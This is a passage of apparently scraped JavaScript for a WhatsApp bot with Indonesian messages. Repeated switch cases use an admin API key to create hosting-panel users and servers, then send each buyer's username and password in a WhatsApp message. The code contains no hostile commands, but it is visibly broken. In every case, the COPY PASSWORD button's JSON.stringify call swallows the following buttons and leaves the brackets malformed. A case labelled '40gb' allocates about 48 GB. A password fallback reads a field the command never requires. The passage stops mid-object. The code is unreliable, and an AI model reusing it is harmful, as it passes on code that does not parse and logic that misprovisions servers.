interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 43175
│ • *DISK :* 43175
│ • *CPU :* 1290%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "44gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "44175"
let cpu = "1320"
let disk = "44175"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 44175
│ • DISK : 44175
│ • CPU : 1320%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 44175
│ • *DISK :* 44175
│ • *CPU :* 1320%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "45gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "45175"
let cpu = "1350"
let disk = "45175"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 45175
│ • DISK : 45175
│ • CPU : 1350%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 45175
│ • *DISK :* 45175
│ • *CPU :* 1350%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "46gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "46175"
let cpu = "1380"
let disk = "46175"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 46175
│ • DISK : 46175
│ • CPU : 1380%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 46175
│ • *DISK :* 46175
│ • *CPU :* 1380%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "47gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "47175"
let cpu = "1410"
let disk = "47175"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 47175
│ • DISK : 47175
│ • CPU : 1410%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 47175
│ • *DISK :* 47175
│ • *CPU :* 1410%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "40gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "48175"
let cpu = "1440"
let disk = "48175"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 48175
│ • DISK : 48175
│ • CPU : 1440%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 48175
│ • *DISK :* 48175
│ • *CPU :* 1440%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "49gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "49175"
let cpu = "1470"
let disk = "49175"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 49175
│ • DISK : 49175
│ • CPU : 1470%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
